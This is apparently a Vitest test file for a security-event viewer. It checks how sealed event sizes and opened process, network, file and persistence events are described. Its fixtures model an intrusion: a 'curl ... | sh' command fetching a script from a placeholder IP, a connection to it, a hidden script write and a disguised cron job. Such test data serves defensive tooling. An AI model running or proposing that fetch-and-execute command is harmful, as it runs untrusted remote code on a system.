import { describe, expect, it } from 'vitest'
import { openedDetail, sealedSize } from './sealed'

describe('sealedSize', () => {
  it('names the size bucket a sealed event was padded to, without its tag', () => {
    expect(sealedSize(272)).toBe('256 B')
    expect(sealedSize(1040)).toBe('1 KB')
    expect(sealedSize(4112)).toBe('4 KB')
    expect(sealedSize(65552)).toBe('64 KB')
    expect(sealedSize(1048592)).toBe('1 MB')
    expect(sealedSize(4194320)).toBe('4 MB')
    expect(sealedSize(1616)).toBe('1.6 KB')
    expect(sealedSize(0)).toBe('0 B')
  })
})

describe('openedDetail', () => {
  const row = (event_type: string, data: Record<string, unknown>) => ({ event_type, data: JSON.stringify(data) })

  it('tells an opened process by its command line, and its end by the process that ended', () => {
    const shell = { action: 'Create', pid: 2052, ppid: 904, executable_path: '/usr/bin/sh', command_line: ['/usr/bin/sh', '-c', 'curl -fsS http://203.0.113.47/u | sh'] }
    expect(openedDetail(row('process', shell))).toBe('/usr/bin/sh -c curl -fsS http://203.0.113.47/u | sh')
    expect(openedDetail(row('process', { action: 'Create', pid: 7, executable_path: '/usr/sbin/nginx', command_line: [] }))).toBe('/usr/sbin/nginx')
    expect(openedDetail(row('process', { action: 'Terminate', pid: 2052, executable_path: '', command_line: [] }))).toBe('ended, pid 2052')
  })

  it('tells every other opened event the way the event list does', () => {
    expect(openedDetail(row('network', { action: 'Connect', dest_ip: '203.0.113.47', dest_port: 8443 }))).toBe('Connect 203.0.113.47:8443')
    expect(openedDetail(row('file', { action: 'Write', path: '/tmp/.cache/run.sh' }))).toBe('Write /tmp/.cache/run.sh')
    expect(openedDetail(row('persistence', { action: 'Added', kind: 'cron', name: 'sysupdate' }))).toBe('Added cron sysupdate')
  })

  it('has nothing to tell of a sealed row', () => {
    expect(openedDetail({})).toBe('')
    expect(openedDetail({ event_type: null, data: null })).toBe('')
  })
})
